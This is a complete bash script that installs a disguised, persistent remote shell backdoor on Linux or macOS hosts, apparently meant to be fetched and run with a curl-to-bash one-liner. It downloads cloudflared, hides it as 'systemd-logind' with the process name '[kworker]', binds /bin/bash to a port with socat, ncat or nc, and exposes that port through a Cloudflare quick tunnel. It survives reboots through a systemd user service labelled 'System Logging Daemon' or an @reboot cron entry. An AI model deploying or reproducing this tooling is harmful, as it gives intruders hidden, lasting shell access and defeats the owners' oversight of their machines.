#!/usr/bin/env bash
# Cloudflare Tunnel Reverse Shell Persistence (like gsocket)
# Usage: bash -c "$(curl -fsSL https://domain/path/deploy.sh)"
# Uninstall: GS_UNDO=1 bash -c "$(curl -fsSL https://domain/path/deploy.sh)"

# ========== KONFIGURASI ==========
: "${HOME:=/tmp}"
: "${USER:=$(whoami 2>/dev/null || echo unknown)}"
: "${UID:=$(id -u 2>/dev/null || echo 0)}"

BIN_HIDDEN_NAME="systemd-logind"
PROC_HIDDEN_NAME="[kworker]"
CONFIG_DIR=".config/dbus"
URL_BASE="https://github.com/cloudflare/cloudflared/releases/latest/download"
TMPDIR="/tmp/.cf-${UID}"
mkdir -p "$TMPDIR" 2>/dev/null || true
PORT=$((RANDOM % 40000 + 10000))

set -euo pipefail

# ========== FUNGSI UTIL ==========
error() { echo -e "\033[1;31m$*\033[0m" >&2; }
info()  { echo -e "\033[1;32m$*\033[0m" >&2; }
warn()  { echo -e "\033[1;33m$*\033[0m" >&2; }

cleanup() {
    [[ -n "$TMPDIR" && -d "$TMPDIR" ]] && rm -rf "$TMPDIR" 2>/dev/null || true
}
trap cleanup EXIT

# ========== DETEKSI ARSITEKTUR ==========
detect_arch() {
    local arch=$(uname -m)
    local os=$(uname -s | tr '[:upper:]' '[:lower:]')
    case "$os" in
        linux)  os="linux" ;;
        darwin) os="darwin" ;;
        *)      error "Unsupported OS: $os"; exit 1 ;;
    esac
    case "$arch" in
        x86_64|amd64) arch="amd64" ;;
        aarch64|arm64) arch="arm64" ;;
        armv7l)        arch="arm" ;;
        i386|i686)     arch="386" ;;
        *) error "Unsupported arch: $arch"; exit 1 ;;
    esac
    echo "${os}-${arch}"
}

# ========== DOWNLOAD CLOUDFLARED ==========
download_cloudflared() {
    local arch="$1"
    local url="${URL_BASE}/cloudflared-${arch}"
    local out="$TMPDIR/cloudflared"
    info "Downloading cloudflared for ${arch}..."
    if command -v curl >/dev/null; then
        curl -fsSL -o "$out" "$url" || { error "Download failed"; exit 1; }
    elif command -v wget >/dev/null; then
        wget -q -O "$out" "$url" || { error "Download failed"; exit 1; }
    else
        error "Need curl or wget"; exit 1
    fi
    chmod 755 "$out"
    echo "$out"
}

# ========== BIND SHELL ==========
start_bindshell() {
    local port="$1"
    local bind_cmd
    if command -v socat >/dev/null; then
        bind_cmd="socat TCP-LISTEN:${port},reuseaddr,fork EXEC:/bin/bash,pty,stderr,setsid,sigint,sane"
    elif command -v ncat >/dev/null; then
        bind_cmd="ncat -lvvk ${port} -e /bin/bash --allow 127.0.0.1"
    elif command -v nc >/dev/null && nc -h 2>&1 | grep -q -e '-e'; then
        bind_cmd="nc -l -p ${port} -e /bin/bash"
    else
        bind_cmd="bash -c 'while true; do nc -l -p ${port} -e /bin/bash 2>/dev/null; done'"
    fi
    eval "nohup $bind_cmd &>/dev/null &"
    echo $!
}

# ========== START TUNNEL (Tersembunyi) ==========
start_tunnel() {
    local port="$1"
    local bin="$2"
    local url_file="$3"
    ( exec -a "$PROC_HIDDEN_NAME" "$bin" tunnel --url "tcp://localhost:${port}" ) 2>&1 | while IFS= read -r line; do
        if [[ "$line" =~ https://([a-z0-9-]+)\.trycloudflare\.com ]]; then
            url="${BASH_REMATCH[0]}"
            echo "$url" > "$url_file"
            echo -e "\n\033[1;32m✅ TUNNEL URL: $url\033[0m" >&2
            echo -e "Connect with:\n  cloudflared access tcp --hostname $url --url localhost:4444 && nc localhost 4444\n" >&2
        fi
        echo "$line" >> "$TMPDIR/cloudflared.log"
    done &
    echo $!
}

# ========== PERSISTENCE ==========
install_persistence() {
    local bin_path="$1"
    local port="$2"
    local script_path="${HOME}/.${CONFIG_DIR}/cf_tunnel.sh"
    local service_name="cf-tunnel"
    mkdir -p "${HOME}/.${CONFIG_DIR}"
    cat > "$script_path" <<EOF
#!/bin/bash
while true; do
    exec -a "$PROC_HIDDEN_NAME" "$bin_path" tunnel --url "tcp://localhost:${port}" 2>&1 | tee -a "$TMPDIR/cloudflared.log"
    sleep 10
done
EOF
    chmod 755 "$script_path"
    if command -v systemctl >/dev/null && systemctl --user --version &>/dev/null; then
        mkdir -p "${HOME}/.config/systemd/user"
        cat > "${HOME}/.config/systemd/user/${service_name}.service" <<EOF
[Unit]
Description=System Logging Daemon
After=network.target

[Service]
ExecStart=$script_path
Restart=always
RestartSec=10
StandardOutput=null
StandardError=null

[Install]
WantedBy=default.target
EOF
        systemctl --user daemon-reload
        systemctl --user enable "$service_name"
        systemctl --user start "$service_name"
        info "Persistence via systemd user service installed."
    elif command -v crontab >/dev/null; then
        (crontab -l 2>/dev/null; echo "@reboot $script_path") | crontab - 2>/dev/null || true
        info "Persistence via crontab installed."
    else
        warn "No persistence method found. Tunnel will not survive reboot."
    fi
}

# ========== UNINSTALL ==========
uninstall() {
    info "Uninstalling..."
    pkill -f "$BIN_HIDDEN_NAME" 2>/dev/null || true
    pkill -f "$PROC_HIDDEN_NAME" 2>/dev/null || true
    pkill -f "cf_tunnel.sh" 2>/dev/null || true
    crontab -l 2>/dev/null | grep -v "cf_tunnel.sh" | crontab - 2>/dev/null || true
    if command -v systemctl >/dev/null; then
        systemctl --user stop cf-tunnel.service 2>/dev/null || true
        systemctl --user disable cf-tunnel.service 2>/dev/null || true
        rm -f "${HOME}/.config/systemd/user/cf-tunnel.service"
    fi
    rm -rf "${HOME}/.${CONFIG_DIR}"
    rm -rf "$TMPDIR"
    info "Uninstall complete."
    exit 0
}

# ========== MAIN ==========
[[ -n "${GS_UNDO:-}" ]] && uninstall

rm -rf "$TMPDIR" 2>/dev/null || true
mkdir -p "$TMPDIR"

arch=$(detect_arch)
cf_bin=$(download_cloudflared "$arch")

INSTALL_DIR="${HOME}/.${CONFIG_DIR}"
mkdir -p "$INSTALL_DIR"
cp "$cf_bin" "$INSTALL_DIR/$BIN_HIDDEN_NAME"
chmod 755 "$INSTALL_DIR/$BIN_HIDDEN_NAME"
cf_bin="$INSTALL_DIR/$BIN_HIDDEN_NAME"

info "Starting bind shell on port $PORT..."
bind_pid=$(start_bindshell "$PORT")
sleep 1

info "Starting Cloudflare tunnel..."
url_file="$TMPDIR/tunnel.url"
tunnel_pid=$(start_tunnel "$PORT" "$cf_bin" "$url_file")
sleep 5

[[ -f "$url_file" ]] || warn "Failed to get tunnel URL. Check $TMPDIR/cloudflared.log"

[[ -z "${GS_NOINST:-}" ]] && install_persistence "$cf_bin" "$PORT"

info "Done. Use GS_UNDO=1 to uninstall."
